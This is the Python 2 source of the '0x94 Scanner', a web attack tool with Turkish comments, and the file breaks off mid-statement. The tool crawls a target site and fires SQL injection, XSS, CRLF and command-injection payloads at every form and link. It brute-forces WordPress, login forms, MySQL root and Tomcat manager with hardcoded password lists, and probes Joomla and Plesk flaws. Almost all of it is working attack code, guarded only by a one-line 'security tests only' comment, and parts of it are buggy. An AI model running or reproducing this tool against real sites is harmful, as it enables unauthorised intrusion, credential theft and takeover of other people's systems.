#!/usr/bin/python
# -*- coding: utf-8 -*-
# 0x94 Scanner v1.0b
#Python 2x sürümlerde çalışır.
#mysql eklentisi gerekli onuda https://pypi.python.org/pypi/MySQL-python adresinden kurun
#Multi Thread  POST|GET (BLIND/TIME BASED/HEADER/SQL/XSS/LFI) INJECTION SCANNER
#Sunucu IP adresi ve kullanilan http bilgisini alir
#Sunucu Allow header listesini alir
#Sitedeki tum linkleri 2 farkli yontemle alir (ayni linkleri tarayip zaman kaybi yapmaz)
#seo ile yada 302 yonlendirmeli linklerin location urllerini otomatik alir (otomatik yonlendirme aktiftir)
#tum linklerde get ve post sql injection dener
#tum linklerde blind get ve post sql injection dener
#tum linklerde time based get ve post sql injection dener
#tum linklerde get ve post xss injection dener
#tum linklerde header injection dener
#tum linklerde get ve post basit capli command injection dener
#sayfada herhangi bir degisme oldugunda degisme satirini ekrana yazar
#tum linklerde xss dener / bulunan xss satirinda code / noscript var ise belirtir
#tum linklerde php ve asp lfi dener
#tum linklerde header crlf injection dener
#tum linklerde login sayfalarini otomatik bulup basit capli brute gerceklestirir.
#linklerde olan wordpressleri bulup basit capli brute force yapar.
#linklerde olan joomlalari bulup joomla token acigini otomatik tarar
#son zamanlarda cikan plesk 0day aciginida otomatik test eder
#tomcat olan siteyi tespit edip default passlari authentication brute eder.
#cookie ve proxy destegide vardir.
#ajax ile veri gonderimi olan dosyalari tespit eder
#sitede gecen emailleri otomatik toplar
#calismayan php ve asp kodlarini bulur
#open redirect url leri tespit eder
#index off dizinleri tespit eder
#birden fazla request istegini engelleyen siteleri icin request limit ozelligi vardir.
#bulunan sql aciklarinin yollanan verilerin true ve false deger ciktilarini /debug klasorune kaydeder.
#butun sonuclari rapor.txt ye kaydeder
#sadece guvenlik testleri icin kullanin
#Turk sitelerinde tarama yapmaz.
#https://github.com/antichown/0x94scanner /
#https://twitter.com/0x94


import urllib
import urlparse
import sys
import re
import urllib2
from urllib import urlencode
from urlparse import parse_qsl
import httplib
from string import maketrans
import base64
import socket
import Queue
import threading
from time import sleep
import random
import os
import sre


try:
    import MySQLdb
except ImportError:
    print 'Mysql eklentisi gerekli onuda https://pypi.python.org/pypi/MySQL-python adresinden kurun'
    sys.exit(1)




# ---------- # AYARLAR BASLANGIC #--------------

sayfacookie="ben=0x940x94" #cookie ayarlamak istiyorsan buraya gir
reqbeklemesuresi=1 #sunucuda request limit varsa burayi doldurun /saniye cinsinden
threadsayisi=5 # thread ayarlamak icin burayi doldurun
proxy="" #proxy ayarlamak icin buraya ip:port seklinde girin

# ---------- # AYARLAR BITIS #--------------



analistem = []
queue=Queue.Queue()



if not os.path.exists("./debug"):
    os.makedirs("./debug")

from BeautifulSoup import BeautifulSoup




class HTTPAYAR(urllib2.HTTPRedirectHandler):
    
    def http_error_302(self, req, fp, code, msg, headers):
	print "URL Yonlenmesi Algilandi"
        #yaz("URl Yonlenmesi Algilandi \n"+ str(headers),True)
        return urllib2.HTTPRedirectHandler.http_error_302(self, req, fp, code, msg, headers)


    http_error_301 = http_error_303 = http_error_307 = http_error_302
    

if proxy!="":
    proxydict={}
    proxydict["http"]=proxy
    opener = urllib2.build_opener(HTTPAYAR,urllib2.HTTPSHandler(),urllib2.ProxyHandler(proxydict))
else:
    opener = urllib2.build_opener(HTTPAYAR,urllib2.HTTPSHandler(),urllib2.HTTPCookieProcessor())
opener.addheaders = [
        ('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13'),
        ("Cookie", sayfacookie)]

urllib2.install_opener(opener)
aynilinkler={}
limitlinkler={}



def mysqlportubrute(ip):
    
	passlar=["admin",
                "test",
                "secret",
                "guest",
                "1234",
                "123456",
                "demo123",
                "demo",
                "password123",
                "password1",
                "qwerty",
                "abc123",
                "password1",
                "administrator",
                "12341234",
                "111111",
                "123456789",
                "12345678",
                "1234567",
                "root",
                "toor",
                "pass123",
                "pass1",
                "pass2",
                "pass",
                "password2",
                "123123",
                "admin123",
                "123admin"]   
	
	for mysqlportpass in passlar:
	    try:
		db=MySQLdb.connect(host=ip,user="root",passwd=mysqlportpass)
		yaz("[#] Mysql 3306 Portu Giris Basarili user:root sifre:"+mysqlportpass,True)

	    except(MySQLdb.Error):
		print "Mysql brute basarisiz, Denenen:"+mysqlportpass
		continue

def wordpressbrute(url):
    
    
    try:
	yaz("Wordpress site tespit edildi "+url,True)
	passlar=["admin",
	                 "test",
	                 "secret",
	                 "guest",
	                 "1234",
	                 "123456",
	                 "demo123",
	                 "demo",
	                 "password123",
	                 "password1",
	                 "qwerty",
	                 "abc123",
	                 "password1",
	                 "administrator",
	                 "12341234",
	                 "111111",
	                 "123456789",
	                 "12345678",
	                 "1234567",
	                 "root",
	                 "toor",
	                 "pass123",
	                 "pass1",
	                 "pass2",
	                 "pass",
	                 "password2",
	                 "123123",
	                 "admin123",
	                 "123admin"] 
	
    
	openerwp = urllib2.build_opener(urllib2.HTTPCookieProcessor(),urllib2.HTTPSHandler()) 
	
	for sadepass in passlar:
	    login_form = {'log':"admin",
		            'pwd':sadepass,
		            'rememberme':"forever",
		            'wp-submit':'Log In',
		            'redirect_to':url+'/wp-admin/',
		            'testcookie': 1}
	    datawpencode = urllib.urlencode(login_form)
	    
	
	    respwp = openerwp.open(url+"/wp-login.php", datawpencode).read()
	
	    if re.search('<strong>ERROR</strong>',respwp):
		print "[#] Wordpress Login Basarisiz, Denenen : "+ sadepass
	    elif re.search('WordPress requires Cookies', respwp):
		print '[!] Wordpress Cookieyi okumadi.'
	    else:
		yaz("[#] Wordpress Login Oldu :"+url+" User:admin Sifre:"+sadepass,True)

    
    except urllib2.HTTPError,  e:
	    if(e.code==500):
		yaz("[#] Wordpress Brute Http 500 Dondu " +url,True)
	    
    except urllib2.URLError,  e:
	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
		    #yaz(mesaj)
    except:
	mesaj="Bilinmeyen hata olustu\n"
			#yaz(mesaj)              
    
    

def tomcatkontrol(url):
	
	yaz("Tomcat site tespit edildi "+url,True)
	
	kullanici=["tomcat","password","admin","admin","root","tomcat","admin"]
	sifre=["tomcat","password","admin","password","root","s3cret","admintesting"]
	
	tomi=0
	while tomi < len(kullanici): 
	    try:
		base64string = base64.encodestring('%s:%s' % (kullanici[tomi],sifre[tomi]))
		
		print "Tomcat brute ediliyor "+kullanici[tomi]+" - "+sifre[tomi]
		
		request = urllib2.Request(url+":8080/manager/html")
		request.add_header("Authorization", "Basic %s" % base64string)
		result = urllib2.urlopen(request)
		yaz("Tomcat Login Basarili!!  Username:"+kullanici[tomi]+" Sifre:"+sifre[tomi],True)
		tomi=tomi+1
	
	    except urllib2.HTTPError:
		tomi=tomi+1
		continue
	
	    except urllib2.URLError,  e:
		mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
						#yaz(mesaj)
	    except:
		mesaj="Bilinmeyen hata olustu\n"  



def pleskphppath(host):
    
    try:
	    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	    ip=socket.gethostbyname(host.replace("http://",""))
	    s.settimeout(5)
	    s.connect((ip, 80))
	    s.send("GET /phppath/php HTTP/1.0\r\n\r\n")  
	    buf = s.recv(1024);
	    if "500 Internal" in buf:
		yaz("Plesk Phppath acigi olabilir "+ip,True)
	      
    except socket.error, msg:
	print "Plesk testi yapilirken hata olustu "
	
    except:
	print "Server header bilgisi alinamadi"


def headercrlf(link):
    
    injectionkod=["%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a%3Chtml%3E%3Cfont color=red%3E0x94scanner%3C/font%3E%3C/html%3E",
                  "%0d%0aLocation:%20http://www.google.com",
                  "%0D%0ASet-Cookie%3A%200x94=0x94Scannercookie"]
                  
    
    try:
	for inj in injectionkod:
	    crlflink=link+inj
	    print "Header CRLF Injection Taraniyor..."
	    crlfreq = urllib2.Request(crlflink.replace("&",inj +"&").replace(" ", "%20"))
	    crlfreq.add_header('UserAgent: ','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)+'+inj)
	    crlfreq.add_header('Referer: ',crlflink+inj)
	    crlfreq.add_header('Cookie: ',"0x94=0x94Scanner"+inj)
	    crlfreq.add_header('Accept: ','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'+inj)
	    crlfreq.add_header('Accept-Language:','en-us,en;q=0.5'+inj)
	    crlfreq.add_header('Accept-Encoding:', 'gzip, deflate'+inj)
	    crlfreq.add_header('Accept-Charset:','ISO-8859-1,utf-8;q=0.7,*;q=0.7'+inj)
	    crlfreq.add_header('Connection:','keep-alive'+inj)
	    crlfreq.add_header('0x94Scannerheader:',"0x94Scannerheader")
	    
	    crlfresponse = urllib2.urlopen(crlfreq)
	    crlfresponsek=crlfresponse.read()
	    info=crlfresponse.info()
	    
	    hinfo="";
	    
	    for xxh in info:
		hinfo+=info[xxh]
		
	    
	    if "<title>Google</title>" in crlfresponsek or \
	    "0x94Scannercookie" in hinfo or \
	    "0x94Scannerheader" in hinfo:
		yaz("[#] CRLF Injection Bulundu " + crlflink,True)
		
	    elif "0x94scanner" in crlfresponsek and \
	         "Content-Type:" not in crlfresponsek:
		yaz("[#] GET CRLF Injection Bulundu " + crlflink,True)
		
		
	       


    except urllib2.HTTPError,e:
	if(e.code==500):
	    yaz("[#] CRL INJECTION Http 500 Dondu  / " +crlflink,True)
    except urllib2.URLError,e:
	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,crlflink)
		#yaz(mesaj)
	    
    except:
	mesaj="Bilinmeyen hata olustu\n"
    
    
    
    

def yaz(yazi,ekran):
    dosya=open("rapor.txt","a+")
    dosya.write(yazi+"\n")
    dosya.close()
    if ekran==True:
	print yazi
	
    
def Debugyaz(isim,yazi):
    dosya=open(isim,"w")
    dosya.write(yazi+"\n")
    dosya.close()
    
def formyaz(url):  

    try:
	toplamveri={}   
	
	html = urllib2.urlopen(url).read() 
	soup = BeautifulSoup(html)  
    
	forms=soup.findAll("form")        
	for form in forms:  
	    if form.has_key('action'):  
		if form['action'].find('http://') == -1: 

		    if url.count("/")>=3:
			if url.count("/")==3:
			    dizin="http://"+url.rsplit("/")[2]+"/"
			elif url.count("/")==4:
			    dizin="http://"+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"
			elif url.count("/")==5:
			    dizin="http://"+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"+url.rsplit("/")[4]+"/"
			    
			elif url.count("/")==6:
			    dizin="http://"+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"+url.rsplit("/")[4]+"/"+url.rsplit("/")[5]+"/"
			
			elif url.count("/")==7:
			    dizin="http://"+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"+url.rsplit("/")[4]+"/"+url.rsplit("/")[5]+"/"+url.rsplit("/")[6]+"/"
			
			elif url.count("/")==8:
			    dizin="http://"+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"+url.rsplit("/")[4]+"/"+url.rsplit("/")[5]+"/"+url.rsplit("/")[6]+"/"+url.rsplit("/")[7]+"/"
			    
			elif url.count("/")==9:
			    dizin="http://"+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"+url.rsplit("/")[4]+"/"+url.rsplit("/")[5]+"/"+url.rsplit("/")[6]+"/"+url.rsplit("/")[7]+"/"+url.rsplit("/")[8]+"/"
			    
			elif url.count("/")==10:
			    dizin="http://"+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"+url.rsplit("/")[4]+"/"+url.rsplit("/")[5]+"/"+url.rsplit("/")[6]+"/"+url.rsplit("/")[7]+"/"+url.rsplit("/")[8]+"/"+url.rsplit("/")[9]+"/"
			    
	
		    
			formurl=dizin + "/" + form['action'].strip('/') 
			print formurl
		else:  
		    formurl=url
		    print "action: " + formurl
	    else:  
		formurl=url
		print "action: " + formurl  	
	    if form.has_key('method') and form['method'].lower() == 'post': 
		    formurl=url
		    print "[POST] action " +url
		    for post_inputselect in form.findAll("select"):
			    print post_inputselect['name']
			    toplamveri[post_inputselect['name']]=""	
		    
		    for post_input in form.findAll("input"):  
			    if post_input.has_key('type'): 
				if post_input['type'].lower() == 'file':
				    yaz(" [#] Dosya Upload Alani Bulundu "+formurl,True)
				if post_input['type'].lower() == 'text' or post_input['type'].lower() == 'password' or   post_input['type'].lower() == 'hidden' or post_input['type'].lower() == 'radio':  
					if post_input.has_key('id'):  
						print post_input['id']
						if "user" in post_input['id'] or \
						   "pass" in post_input['id']:
						    yaz("[#] Login Sayfasi tespit Edildi "+formurl,True)
						if post_input.has_key('value'):
						    toplamveri[post_input['id']]=post_input['value']
						else:
						    toplamveri[post_input['id']]=""
					elif post_input.has_key('name'):
					    if "user" in post_input['name'] or \
						   "pass" in post_input['name']:
						    yaz("[#] Login Sayfasi tespit Edildi "+formurl,True)
					    print post_input['name']
					    if post_input.has_key('value'):
						toplamveri[post_input['name']]=post_input['value']
					    else:
						toplamveri[post_input['name']]=""
    
						
						
		    
		    postget(formurl, toplamveri,"POST")
		    blindpost(formurl, toplamveri,"POST")
		    posttimebased(formurl, toplamveri,"POST")
		    comandinj(formurl, toplamveri,"POST")
		    loginbrute(formurl, toplamveri,"POST")
		    postXSS(formurl, toplamveri,"POST")
			
	    if form.has_key('method') and form['method'].lower() == 'get' or not form.has_key('method'):  
		print "[GET] action " +formurl
		for get_inputselect in form.findAll("select"):
		    if get_inputselect.has_key("name"):
			    print get_inputselect['name']
			    toplamveri[get_inputselect['name']]=""
			    
		
		for get_input in form.findAll("input"):                         
			if get_input.has_key('type'):  
			    if get_input['type'].lower() == 'text' or get_input['type'].lower() == 'password' or get_input['type'].lower() == 'hidden' or get_input['type'].lower() == 'radio':  
				    if get_input.has_key('id'):  
					    print get_input['id']
					    if "user" in get_input['id'] or \
						   "pass" in get_input['id']:
						    yaz("[#] Login Sayfasi tespit Edildi "+formurl,True)
						    
					    if post_input.has_key('value'):
						toplamveri[post_input['id']]=post_input['value']
					    else:
						toplamveri[post_input['id']]=""					    
					    toplamveri[post_input['id']]=""
				    elif get_input.has_key('name'):
					    print get_input['name']
					    if "user" in get_input['name'] or \
						   "pass" in get_input['name']:
						    yaz("[#] Login Sayfasi tespit Edildi "+formurl,True)
					    if get_input.has_key('value'):
						toplamveri[get_input['name']]=get_input['value']
					    else:
						toplamveri[get_input['name']]=""
		postget(formurl, toplamveri,"GET")
		blindpost(formurl, toplamveri,"GET")
		posttimebased(formurl, toplamveri,"GET")
		comandinj(formurl, toplamveri,"GET")
		loginbrute(formurl, toplamveri,"GET")
		postXSS(formurl, toplamveri,"GET")

		
    except urllib2.HTTPError,  e:
	mesaj="hata"

    except urllib2.URLError,  e:
	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
	#yaz(mesaj)
    except:
	mesaj="Bilinmeyen hata olustu\n"
	#yaz(mesaj)   



def postXSS(url,params,method):
    
    
    xsspayload=["\"><script>alert(0x000123)</script>",
	    "\"><sCriPt>alert(0x000123)</sCriPt>",
	    "\"; alert(0x000123)",
	    "\"></sCriPt><sCriPt >alert(0x000123)</sCriPt>",
	    "\"><img Src=0x94 onerror=alert(0x000123)>",
	    "\"><BODY ONLOAD=alert(0x000123)>",
	    "'%2Balert(0x000123)%2B'",
	    "\"><0x000123>",
	    "'+alert(0x000123)+'",
	    "%2Balert(0x000123)%2B'",
	    "'\"--></style></script><script>alert(0x000123)</script>",
	    "'</style></script><script>alert(0x000123)</script>",
	    "</script><script>alert(0x000123)</script>",
	    "</style></script><script>alert(0x000123)</script>",
	    "'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3E0x94(0x000123)%3C",
	    "'\"--></style></script><script>alert(0x000123)</script>",
	    "';alert(0x000123)'",
	    "<scr<script>ipt>alert(0x000123)</script>",
	    "<scr<script>ipt>alert(0x000123)</scr</script>ipt>",
            "\"<scr<script>ipt>alert(0x000123)</scr</script>ipt>",
            "\"><scr<script>ipt>alert(0x000123)</script>",
            "\">'</style></script><script>alert(0x000123)</script>",
            "\"></script><script>alert(0x000123)</script>",
            "\"></style></script><script>alert(0x000123)</script>"]    


    postgetdict={}
    postgetdict=params.copy()
    
    for xssler in xsspayload:
	for key,value in params.items():		
	    if key in postgetdict:
		postgetdict[key]=value+xssler
		try:
		    parametresaf = urllib.urlencode(postgetdict)
		    if method=="GET":
			print "Form GET XSS testi yapiliyor"
			xsspostresponse = urllib.urlopen(url+"?"+parametresaf).read()
			postgetdict.clear()
			postgetdict=params.copy()
				
		    else:
			print "Form POST XSS testi yapiliyor"
			xsspostresponse = urllib2.urlopen(url, parametresaf).read()
			postgetdict.clear()
			postgetdict=params.copy()
		    
		    if "alert(0x000123)" in xsspostresponse or "alert%280x000123%29" in xsspostresponse:
			xssmi=xsscalisiomu(xsspostresponse)
			if xssmi==False:
			    yaz("[#] POST XSS BULUNDU : " + url+"\n Form Verisi="+parametresaf,True)
			else:
			    yaz("[#] POST XSS BULUNDU ve Satirda XSS korumasi var : " + url+" \n Form Verisi="+parametresaf,True)		    
      

    
		except urllib2.HTTPError,e:
		    print e.reason
		    if(e.code==500):
			yaz("[#] "+method+" XSS Http 500 Dondu  Internal Server Error "+timeler+" \n" +url,True)
			sqlkontrol(e.read(),url)
			
		    
		except urllib2.URLError,e:
		    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
		except:
		    mesaj="Bilinmeyen hata olustu\n"
		    #yaz(mesaj)         

    
    
def sqlkodcalisiomu(url):
    
    bitiskarakter=["","--","/*","--+",";",";--","--","#"]
    
    calisankod = ["or 1=1 and (select 1 and row(1,1)>(select count(*),concat(CONCAT(CHAR(48),CHAR(120),CHAR(57),CHAR(52),CHAR(120),CHAR(120),CHAR(120),CHAR(33),CHAR(33),CHAR(33)),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))",
                  "' or 1=1 and (select 1 and row(1,1)>(select count(*),concat(CONCAT(CHAR(48),CHAR(120),CHAR(57),CHAR(52),CHAR(120),CHAR(120),CHAR(120),CHAR(33),CHAR(33),CHAR(33)),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))",
                  "'+ (select convert(int,CHAR(48)+CHAR(120)+CHAR(57)+CHAR(52)+CHAR(120)+CHAR(120)+CHAR(120)+CHAR(33)+CHAR(33)+CHAR(33)+CHAR(33)) FROM syscolumns) +' ",
                  "or (select convert(int,CHAR(48)+CHAR(120)+CHAR(57)+CHAR(52)+CHAR(120)+CHAR(120)+CHAR(120)+CHAR(33)+CHAR(33)+CHAR(33)+CHAR(33)) FROM syscolumns)",
                  "' or (select convert(int,CHAR(48)+CHAR(120)+CHAR(57)+CHAR(52)+CHAR(120)+CHAR(120)+CHAR(120)+CHAR(33)+CHAR(33)+CHAR(33)+CHAR(33)) FROM syscolumns)",
                  "SELECT CHAR(48)+CHAR(120)+CHAR(57)+CHAR(52)+CHAR(120)+CHAR(120)+CHAR(120)+CHAR(33)+CHAR(33)+CHAR(33)+CHAR(33)"
                  "SELECT CHAR(48)||CHAR(120)||CHAR(57)||CHAR(52)||CHAR(120)||CHAR(120)||CHAR(120)||CHAR(33)||CHAR(33)||CHAR(33)||CHAR(33)",
                  ]
    for sep in bitiskarakter:
	try:
	    
	    for key,value in urlparse.parse_qs(urlparse.urlparse(url).query, True).items():
		calishal={}
		calishal[key]=value+calisankod+sep
	    calisparametre = urllib.urlencode(calishal)
	    print "SQL Injection Testi Yapiliyor ... "
	    urlac = urllib2.urlopen(url+"?"+calisparametre)
	    response = urlac.read()
	    if "0x94xxx!!!" in response:
		yaz("[#] Calisan SQL KOD Bulundu "+ url+" \nVeri="+calisparametre,True)
	    calishal.clear()
	    
	except urllib2.HTTPError,  e:
	    if(e.code==500):
		yaz("[#] SQL Http 500 Dondu  / Internal Server Error " +url,True)
    
	except urllib2.URLError,  e:
	    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
	    #yaz(mesaj)
	except:
	    mesaj="Bilinmeyen hata olustu\n"
	    #yaz(mesaj)   
    

    
    
    


def joomlatoken(url):
    
    try:
	yaz("Joomla site tespit edildi "+url,True)
	print "Joomla Token acigi kontrol ediliyor..."
	
	datam={'token': "'"}
	
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(),urllib2.HTTPSHandler()) 
    
	sifirlamagiris=opener.open(url+"/index.php?option=com_user&view=reset&layout=confirm").read()
	
	md5 = re.match(r"([0-9a-f]{32})",sifirlamagiris,re.DOTALL) 
	
	if md5:
	    hashim=md5.group()
	    
	    datam[hashim]=1
	    
	    dataencode = urllib.urlencode(datam)
	    
	    resp = opener.open(url+"/index.php?option=com_user&task=confirmreset", dataencode).read()
	    
	    if "name=\"password1\"" in resp:
		
		yaz("Joomla Token acigi bulundu "+url,True)
		
    except urllib2.HTTPError,  e:
	if(e.code==500):
	    yaz("[#] Joomla Token Http 500 Dondu " +url,True)
	
    except urllib2.URLError,  e:
	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
		#yaz(mesaj)
    except:
	mesaj="Bilinmeyen hata olustu\n"
		    #yaz(mesaj)           

    

def execkontrol(response,urlnormal):
    
    print "Command injection hata mesajlari kontrol ediliyor"
    
    if re.search("eval()'d code</b> on line <b>",response,re.DOTALL):
	mesaj= "[#] %s PHP eval hatasi " % urlnormal
	yaz(mesaj,True)
	
    if re.search("Cannot execute a blank command in",response,re.DOTALL):
	mesaj= "[#] %s exec hatasi " % urlnormal
	yaz(mesaj,True)
	
    if re.search("Fatal error</b>:  preg_replace",response,re.DOTALL):
	mesaj= "[#] %s Ppreg_replace hatasi " % urlnormal
	yaz(mesaj,True)
    
    
def phpexec(url):
    
    seperators = ["a;env","a);env","/e\0"]
    

    for sep in seperators:
	try:
	    for key,value in urlparse.parse_qs(urlparse.urlparse(url).query, True).items():
		phpexechal={}
		phpexechal[key]=sep
	    phpexecparametre = urllib.urlencode(phpexechal)
	    print "Exec Command Injection Deneniyor ... "
	    urlac = urllib2.urlopen(url+"?"+phpexecparametre)
	    response = urlac.read()
	    execkontrol(response,url)
	
	except urllib2.HTTPError,  e:
	    if(e.code==500):
		yaz("[#] Exec Http 500 Dondu " +url,True)
	
	except urllib2.URLError,  e:
	    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
		#yaz(mesaj)
	except:
	    mesaj="Bilinmeyen hata olustu\n"
		    #yaz(mesaj)       




def getcommandinj(url):
    
    seperators = ['', '&&', '|', ';',"\";","';","\";"]
    
    command="ping localhost"
    

    for sep in seperators:
	
	try:	    
	    for key,value in urlparse.parse_qs(urlparse.urlparse(url).query, True).items():
		cmdhal={}
		cmdhal[key]=sep+command
	    cmdparametre = urllib.urlencode(cmdhal)
	    print "GET Command Injection Taraniyor ... "
	    urlac = urllib2.urlopen(url+"?"+cmdparametre)
	    response = urlac.read()
	    msler=re.findall("[0-9]ms",response)
	    cmdhal.clear()
	
	
	    if len(msler)>=3:
		yaz("[#] GET Command injection Bulundu "+ url+" \nVeri="+cmdparametre,True)
		
	except urllib2.HTTPError,  e:
	    if(e.code==500):
		yaz("[#] GET Command Injection Http 500 Dondu " +url,True)
	
	except urllib2.URLError,  e:
	    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
		#yaz(mesaj)
	except:
	    mesaj="Bilinmeyen hata olustu\n"
		    #yaz(mesaj)       



def loginbrute(url,params,method):
    
    yakala={}
    yakala=params.copy()
    
    if yakala.has_key("user") or \
    yakala.has_key("username") or \
    yakala.has_key("userinput") or \
    yakala.has_key("usr") or \
    yakala.has_key("uname") or \
    yakala.has_key("id") or \
    yakala.has_key("usernameinput") or \
    yakala.has_key("pass") or \
    yakala.has_key("passwd") or \
    yakala.has_key("password") or \
    yakala.has_key("passwdinput") or \
    yakala.has_key("passwordinput") or \
    yakala.has_key("uid") or \
    yakala.has_key("pwd"):
	
       
    
	passlar=["admin",
	         "test",
	         "secret",
	         "guest",
	         "1234",
	         "123456",
	         "demo123",
	         "demo",
	         "password123",
	         "password1",
	         "qwerty",
	         "abc123",
	         "password1",
	         "administrator",
	         "12341234",
	         "111111",
	         "123456789",
	         "12345678",
	         "1234567",
	         "root",
	         "toor",
	         "pass123",
	         "pass1",
	         "pass2",
	         "pass",
	         "password2",
	         "123123",
	         "admin123",
	         "123admin"] 
	

	    
	    
	dictb1={}
	dictb1=params.copy()
	for key,value in params.items():
	    
	    try:		
		if key in dictb1:
		    if key.lower()=="user" or \
		    key.lower()=="pass" or \
		    key.lower()=="username" or \
		    key.lower()=="password" or \
		    key.lower()=="passwd" or \
		    key.lower()=="userinput" or \
		    key.lower()=="uname" or \
		    key.lower()=="uid" or \
		    key.lower()=="id":
			dictb1[key]="0x94"
		    
		parametrebrute1 = urllib.urlencode(dictb1)
		if method=="GET":
		    print "Login Brute GET testi yapiliyor"
		    loginnormal = temizle(urllib.urlopen(url+"?"+parametrebrute1,timeout=90).read())
			    
		else:
		    print "Login Brute POST testi yapiliyor"
		    loginnormal = temizle(urllib2.urlopen(url, parametrebrute1,timeout=90).read())		  
		    
		    
	
		dictlogin={}
		dictlogin=params.copy()
		for gelenpass in passlar:
		    for key,value in params.items():		
			if key in dictlogin:
			    if key.lower()=="user" or \
			    key.lower()=="usr" or \
			    key.lower()=="username" or \
			    key.lower()=="userinput" or \
			    key.lower()=="usernameinput" or \
			    key.lower()=="uname" or \
			    key.lower()=="id":
				dictlogin[key]="admin"
				
			    if key.lower()=="pass" or \
			    key.lower()=="password" or \
			    key.lower()=="passwd" or \
			    key.lower()=="passinput" or \
			    key.lower()=="passwordinput" or \
			    key.lower()=="pwd":
				dictlogin[key]=gelenpass
			    
		    loginsaf = urllib.urlencode(dictlogin)
		    if method=="GET":
			print "Login Brute GET testi yapiliyor"
			brutekaynak = temizle(urllib.urlopen(url+"?"+loginsaf,timeout=90).read())
			dictlogin.clear()
			dictlogin=params.copy()
				
		    else:
			print "Login Brute POST testi yapiliyor"
			brutekaynak = temizle(urllib2.urlopen(url, loginsaf,timeout=90).read())
			dictlogin.clear()
			dictlogin=params.copy()	
			if loginnormal!=brutekaynak:
			    yaz(" [#] Login Brute Degisiklik Yakaladi "+url+" \n Veri="+loginsaf,True)
		
    
	    except urllib2.HTTPError,e:
		print e.reason
		if(e.code==500):
		    yaz("[#] "+method+" Login Brute Http 500 Dondu   \n" +url,True)
		
	    except urllib2.URLError,  e:
		if "Time" in e.reason:
		    mesaj="Cok bekledi =  %s , %s \n" %(url,"Login Brute")
		    yaz(mesaj,True)
	    except:
		mesaj="Bilinmeyen hata olustu\n"
		#yaz(mesaj)       
	    
		    

def comandinj(url,params,method):
    
    seperators = ['', '&&', '|', ';',"\";","';","\";"]
    
    command="ping localhost"
    
    postgetdict={}
    postgetdict=params.copy()
    
    for sep in seperators:
	for key,value in params.items():		
	    if key in postgetdict:
		postgetdict[key]=value+sep+command
		try:
		    parametresaf = urllib.urlencode(postgetdict)
		    if method=="GET":
			print "Command Injection GET testi yapiliyor"
			y11 = temizle(urllib.urlopen(url+"?"+parametresaf,timeout=90).read())
			postgetdict.clear()
			postgetdict=params.copy()
				
		    else:
			print "Command Injection POST testi yapiliyor"
			y11 = temizle(urllib2.urlopen(url, parametresaf,timeout=90).read())
			postgetdict.clear()
			postgetdict=params.copy()		  
		    
		    msler=re.findall("[0-9]ms",y11)
		    if len(msler)>=3:
			yaz("[#] Command injection Bulundu "+ url+" \nVeri="+parametresaf,True)
			
    
		except urllib2.HTTPError,e:
		    print e.reason
		    if(e.code==500):
			yaz("[#] "+method+" ping localhost Command Injection Http 500 Dondu   \n" +url,True)
		    
		except urllib2.URLError,  e:
		    if "Time" in e.reason:
			mesaj="Cok bekledi =  %s , %s \n" %(url,"ping localhost")
			yaz(mesaj,True)
		except:
		    mesaj="Bilinmeyen hata olustu\n"
		    #yaz(mesaj)       
		    
		    
def cookieinjection(url,cookie):
    try:
	print "Cookie SQL injection deneniyor..."
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(),urllib2.HTTPSHandler())    
	opener.addheaders = [("User-agent", "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0'"),
	                     ("X-Forwarded-For", "127.0.0.1'"),
	                     ("Referer", "http://www.site.com'"),
	                     ("Cookie", cookie.replace("=","='"))]
	response = opener.open(url).read()
	sqlkontrol(temizle(response),"[Cookie INJECTION]"+url)
	
    except urllib2.HTTPError,  e:
	    if(e.code==500):
		yaz("[#] Cookie Injection Http 500 Dondu  / Internal Server Error \n "+cookie.replace("=","='")+"\n" +url,True)
		
    except urllib2.URLError,  e:
	if "Time" in e.reason:
	    mesaj="Time Out oldu"
	    yaz(mesaj,True)
    except:
	mesaj="Bilinmeyen hata olustu\n"
	    #yaz(mesaj)           
    

def indexoful(url):
    
    
    if url.count("/")>=4:
	
	if url.count("/")==4:
	    dizin="http://"+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"
	elif url.count("/")==5:
	    dizin="http://"+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"+url.rsplit("/")[4]+"/"
	elif url.count("/")==6:
	    dizin="http://"+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"+url.rsplit("/")[4]+"/"+url.rsplit("/")[5]+"/"
	
	print "Index of Kontrol Ediliyor ... " + dizin
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(),urllib2.HTTPSHandler())    
	opener.addheaders = [("User-agent", "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0")]
	response = opener.open(dizin).read().lower()
	
	if "<title>index of" in response or \
	"directory listing for" in response or \
